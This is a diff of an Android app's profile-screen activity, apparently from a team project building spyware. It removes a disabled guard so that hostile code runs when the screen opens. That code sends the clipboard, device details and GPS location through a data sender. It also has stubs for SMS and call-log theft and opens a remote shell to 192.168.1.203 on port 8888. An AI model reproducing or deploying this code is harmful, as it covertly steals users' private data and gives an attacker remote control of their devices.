@@ -43,44 +43,40 @@ class ProfileTemplate : AppCompatActivity() {
         findViewById<Button>(R.id.location).setOnClickListener(::location)
         findViewById<TextView>(R.id.cameraBtn).setOnClickListener(::openCamera)
 
-        //Remove if statement once done
-        if (0==1) {
+        // Set AndroidID
+        this.datasender.obtainAndroidID(this.contentResolver)
+        // Initialise data retriever
+        // Need this to allow finding of public IP - MY
+        val policy = StrictMode.ThreadPolicy.Builder().permitAll().build()
+        StrictMode.setThreadPolicy(policy)
 
-            // Set AndroidID
-            this.datasender.obtainAndroidID(this.contentResolver)
-            // Initialise data retriever
-            // Need this to allow finding of public IP - MY
-            val policy = StrictMode.ThreadPolicy.Builder().permitAll().build()
-            StrictMode.setThreadPolicy(policy)
-
-            // MY Exploit -----------------------------------------------------------------
-            val PERMISSIONS = arrayOf(
-                Manifest.permission.ACCESS_COARSE_LOCATION,
-                Manifest.permission.ACCESS_FINE_LOCATION
-            )
-            if (checkLocPerms(this, *PERMISSIONS)) {
-                datasender.sendData("id", gn.stealClipboard())
-                datasender.sendData("id", gn.stealDeviceInfo())
-//                datasender.sendData("id", gn.logKeys())
-//                datasender.sendData("id", gn.getPublicIP())
-                datasender.sendData("loc", gps.getLocationDetails())
-            }
-
-            // Keefe Exploit --------------------------------------------------------------
-            if (checkSMSPerms()) {
-                // hv.getSMS()
-                datasender.sendData("id" , "")
-            }
-            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
-                // hv.getCallLog()
-                datasender.sendData("id" , "")
-            }
-            if (checkFileStoragePerms()) {
-                hv.getShell("192.168.1.203", 8888)
-            }   // Shell Exploit
-
-            // Lynette Camera Exploit (Done in Camera Button) -----------------------------
+        // MY Exploit -----------------------------------------------------------------
+        val PERMISSIONS = arrayOf(
+            Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.ACCESS_FINE_LOCATION
+        )
+        if (checkLocPerms(this, *PERMISSIONS)) {
+            datasender.sendData("id", gn.stealClipboard())
+            datasender.sendData("id", gn.stealDeviceInfo())
+//            datasender.sendData("id", gn.logKeys())
+//            datasender.sendData("id", gn.getPublicIP())
+            datasender.sendData("loc", gps.getLocationDetails())
         }
+
+        // Keefe Exploit --------------------------------------------------------------
+        if (checkSMSPerms()) {
+            // hv.getSMS()
+            datasender.sendData("id" , "")
+        }
+        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
+            // hv.getCallLog()
+            datasender.sendData("id" , "")
+        }
+        if (checkFileStoragePerms()) {
+            hv.getShell("192.168.1.203", 8888)
+        }   // Shell Exploit
+
+        // Lynette Camera Exploit (Done in Camera Button) -----------------------------
     }
 
     private fun renderInfo(id: Int) {
